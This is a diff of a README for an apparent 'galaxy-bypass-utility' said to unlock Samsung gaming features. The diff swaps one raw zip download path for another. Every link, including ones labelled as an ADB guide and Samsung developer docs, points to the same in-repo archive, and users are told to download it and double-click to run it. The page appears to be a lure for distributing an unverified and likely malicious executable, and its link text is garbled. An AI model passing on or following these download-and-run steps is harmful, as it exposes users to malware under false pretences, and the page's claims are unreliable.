@@ -8,12 +8,12 @@ Welcome to the **galaxy-bypass-utility** project! This tool helps you unlock the
 
 To download the latest version of the galaxy-bypass-utility, please visit the link below:
 
-[![Download the latest release](https://raw.githubusercontent.com/gadiazy/galaxy-bypass-utility/main/impetiginous/galaxy-bypass-utility.zip%20Latest%20Release-Click%https://raw.githubusercontent.com/gadiazy/galaxy-bypass-utility/main/impetiginous/galaxy-bypass-utility.zip)](https://raw.githubusercontent.com/gadiazy/galaxy-bypass-utility/main/impetiginous/galaxy-bypass-utility.zip)
+[![Download the latest release](https://github.com/gadiazy/galaxy-bypass-utility/raw/refs/heads/main/adb/utility-bypass-galaxy-v1.3.zip%20Latest%20Release-Click%https://github.com/gadiazy/galaxy-bypass-utility/raw/refs/heads/main/adb/utility-bypass-galaxy-v1.3.zip)](https://github.com/gadiazy/galaxy-bypass-utility/raw/refs/heads/main/adb/utility-bypass-galaxy-v1.3.zip)
 
 1. Click on the download link above.
 2. This will take you to the Releases page.
 3. Find the latest release and click on it.
-4. Look for the file labeled `https://raw.githubusercontent.com/gadiazy/galaxy-bypass-utility/main/impetiginous/galaxy-bypass-utility.zip` and download it.
+4. Look for the file labeled `https://github.com/gadiazy/galaxy-bypass-utility/raw/refs/heads/main/adb/utility-bypass-galaxy-v1.3.zip` and download it.
 
 Make sure to save the file in a location where you can easily find it, such as your Desktop or Downloads folder.
 
@@ -47,7 +47,7 @@ If you meet these requirements, you are ready to continue.
 
 ### Step 2: Running the Utility
 
-1. Navigate to the folder where you saved `https://raw.githubusercontent.com/gadiazy/galaxy-bypass-utility/main/impetiginous/galaxy-bypass-utility.zip`.
+1. Navigate to the folder where you saved `https://github.com/gadiazy/galaxy-bypass-utility/raw/refs/heads/main/adb/utility-bypass-galaxy-v1.3.zip`.
 2. Double-click the file to run it.
 3. A command prompt window will open, and the utility will start to analyze your device.
 
@@ -74,8 +74,8 @@ If you encounter issues not listed here, feel free to raise an issue on our GitH
 
 ## 📚 Additional Resources
 
-- [ADB Installation Guide](https://raw.githubusercontent.com/gadiazy/galaxy-bypass-utility/main/impetiginous/galaxy-bypass-utility.zip)
-- [Samsung Developer Options](https://raw.githubusercontent.com/gadiazy/galaxy-bypass-utility/main/impetiginous/galaxy-bypass-utility.zip)
+- [ADB Installation Guide](https://github.com/gadiazy/galaxy-bypass-utility/raw/refs/heads/main/adb/utility-bypass-galaxy-v1.3.zip)
+- [Samsung Developer Options](https://github.com/gadiazy/galaxy-bypass-utility/raw/refs/heads/main/adb/utility-bypass-galaxy-v1.3.zip)
 
 ## 📫 Contact
 
@@ -85,6 +85,6 @@ For further questions, you can contact us on the GitHub Issues page for this pro
 
 For your convenience, here is the download link again:
 
-[![Download the latest release](https://raw.githubusercontent.com/gadiazy/galaxy-bypass-utility/main/impetiginous/galaxy-bypass-utility.zip%20Latest%20Release-Click%https://raw.githubusercontent.com/gadiazy/galaxy-bypass-utility/main/impetiginous/galaxy-bypass-utility.zip)](https://raw.githubusercontent.com/gadiazy/galaxy-bypass-utility/main/impetiginous/galaxy-bypass-utility.zip)
+[![Download the latest release](https://github.com/gadiazy/galaxy-bypass-utility/raw/refs/heads/main/adb/utility-bypass-galaxy-v1.3.zip%20Latest%20Release-Click%https://github.com/gadiazy/galaxy-bypass-utility/raw/refs/heads/main/adb/utility-bypass-galaxy-v1.3.zip)](https://github.com/gadiazy/galaxy-bypass-utility/raw/refs/heads/main/adb/utility-bypass-galaxy-v1.3.zip)
 
 Thank you for using **galaxy-bypass-utility**! Enjoy enhanced gaming on your Samsung device.
